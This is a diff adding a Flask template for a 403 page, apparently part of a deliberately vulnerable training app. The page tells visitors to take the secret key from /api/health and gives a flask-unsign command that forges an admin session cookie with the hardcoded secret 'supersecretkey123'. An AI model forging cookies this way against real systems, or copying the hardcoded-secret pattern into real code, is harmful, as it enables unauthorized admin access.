@@ -1,0 +1,16 @@
+{% extends "base.html" %}
+{% block title %}Access Denied{% endblock %}
+{% block content %}
+<div class="card" style="text-align:center;padding:50px 30px;">
+  <div style="font-size:3rem;margin-bottom:12px;">🔒</div>
+  <h1 style="color:#e63946;">403 – Access Denied</h1>
+  <p style="color:#888;margin-top:10px;margin-bottom:20px;">You need the <code>admin</code> role. Forge the session cookie using the known secret key.</p>
+  <div style="background:#0a0a18;border:1px solid #252545;border-radius:7px;padding:16px;text-align:left;max-width:600px;margin:0 auto;">
+    <p style="font-size:0.8rem;color:#555;margin-bottom:8px;">Step 1 — Install flask-unsign:</p>
+    <code style="display:block;color:#f9a8d4;font-size:0.82rem;">pip install flask-unsign</code>
+    <p style="font-size:0.8rem;color:#555;margin-top:12px;margin-bottom:8px;">Step 2 — Get secret key from <a href="/api/health" style="color:#60a5fa;">/api/health</a>, then forge cookie:</p>
+    <code style="display:block;color:#f9a8d4;font-size:0.82rem;word-break:break-all;">flask-unsign --sign --cookie "{'role':'admin','user_id':1,'username':'admin'}" --secret supersecretkey123</code>
+    <p style="font-size:0.8rem;color:#555;margin-top:12px;margin-bottom:8px;">Step 3 — Replace your <code>session</code> cookie in DevTools → Application → Cookies.</p>
+  </div>
+</div>
+{% endblock %}
